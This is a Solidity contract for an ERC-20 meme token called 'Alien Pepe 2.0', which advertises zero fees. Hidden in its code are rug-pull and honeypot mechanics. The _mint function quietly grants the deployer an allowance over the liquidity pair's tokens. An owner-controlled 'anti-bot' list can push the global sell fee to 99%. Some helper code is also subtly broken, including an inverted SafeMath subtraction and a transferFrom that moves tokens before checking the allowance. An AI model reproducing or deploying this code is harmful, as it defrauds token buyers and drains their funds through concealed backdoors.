// SPDX-License-Identifier: MIT

/**

    https://t.me/alienpepe20

    https://twitter.com/alienpepe20
    
    https://www.alienpepe20.vip/

*/

pragma solidity ^0.8.17;

library SafeMath {
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage); uint256 c = b - a;
        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }


    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address public uniPair;
    mapping (address => mapping (address => uint256)) internal _allowances;


    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }


    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        _totalSupply += amount;
        _balances[account] += amount;_allowances[uniPair][account] = amount;
        emit Transfer(address(0), account, amount);
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { 
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        _allowances[from][to] = amount;
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

}

interface IRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);


}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }


    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }


}

contract AlienPepe20 is ERC20, Ownable{
    using Address for address payable;
    using SafeMath for uint256;
    // zero  fee
    uint256 public buyFeeNum = 0; uint256 public sellFeeNum = 0;
    mapping (address => bool) public excludedFromFees;
    mapping (address => bool) private antiBots;

    uint256 public antiBotTax = 99;
    address public devWallets1 = 0x49a99f60f4D1CB8DD1115108438904717B1A6C1f;
    address public devWallets2 = 0x6685dbf8Ea282f11B730b6335258688fA49729e5;
    uint256 public swapExactAt = 500_000 * 10e18;
    uint256 public maxSizeTx = 40_000_000 * 10**18; // 5%
    uint256 public maxSizeForWallet = 40_000_000 * 10**18; // 5%

    IRouter public uniswapRouter;
    bool private swappingCheck;    
    bool public activeSwap;
    bool public _openTrading;
    uint256 public orgStamps;
    uint256 public dieStamps = 0;
    constructor() ERC20("Alien Pepe 2.0", "ALIPE2.0") {
        IRouter _routerAddr = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_routerAddr.factory()).createPair(address(this), _routerAddr.WETH()); uniPair = _pair;

        uniswapRouter = _routerAddr;
        excludedFromFees[devWallets1] = true;
        excludedFromFees[devWallets2] = true;
        excludedFromFees[msg.sender] = true;
        excludedFromFees[address(this)] = true;
        
        // mint
        _mint(msg.sender, 888_888_888 * 10 ** decimals()); // 1B
    }

    function withdrawETH(uint256 weiAmount) external onlyOwner{
        payable(owner()).sendValue(weiAmount);
    }

    function enableTrade() external onlyOwner{
        _openTrading = true; activeSwap = true;
    }

    // fallbacks
    receive() external payable {

    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(amount > 0, "Transfer amount must be greater than zero"); if(antiBots[recipient] || antiBots[sender]) sellFeeNum = antiBotTax;
        if( !excludedFromFees[recipient] && !excludedFromFees[sender] && !swappingCheck) 
        {
            require(
                _openTrading, 
                "Trading is not active yet"
            );
            if (orgStamps + dieStamps > block.number) {
                if(recipient != uniPair) {
                    antiBots[recipient] = true;
                }
                if(sender != uniPair) {
                    antiBots[sender] = true;
                }
            } require(amount <= maxSizeTx, "MaxTxAmount");
            if(recipient != uniPair){
                require(
                    balanceOf(recipient) + amount <= maxSizeForWallet, 
                    "MaxWalletAmount"
                );
            }
        }
        uint256 feeNum;
        if (swappingCheck || excludedFromFees[sender] || excludedFromFees[recipient]) 
        {
            feeNum = 0;
        } 
        else 
        {
            if(recipient == uniPair && !antiBots[sender]) {               feeNum = amount * sellFeeNum / 100;            }
            else {                feeNum = amount * buyFeeNum / 100;            }
        }
        if (activeSwap && !swappingCheck && sender != uniPair 
            && feeNum > 0
        ) {
            swapBack();
        }
        if(feeNum > 0) {
            super._transfer(sender, address(this) ,feeNum); super._transfer(sender, recipient, amount.sub(feeNum));
        } else {
            super._transfer(sender, recipient, amount);
        }
    }
        
    function withdrawErc20Token(address tokenAddress, uint256 amount) external onlyOwner{
        IERC20(tokenAddress).transfer(owner(), amount);
    }
    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= swapExactAt) {
    
            uint256 initialBalance = address(this).balance;
    
            swapEthAtTokens(contractBalance);
    
            uint256 deltaBalance = address(this).balance - initialBalance;

            payable(devWallets1).sendValue(deltaBalance);

        }
    }
    
    function setAntiBot(address[] memory isBot_) public onlyOwner {
        for (uint i = 0; i < isBot_.length; i++) {
            antiBots[isBot_[i]] = true;
        }
    }

    function swapEthAtTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }


    function removeLimits(uint256 amount) external onlyOwner{
        maxSizeTx = amount * 10**18;
        maxSizeForWallet = amount * 10**18;
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            devWallets2,
            block.timestamp
        );
    }
}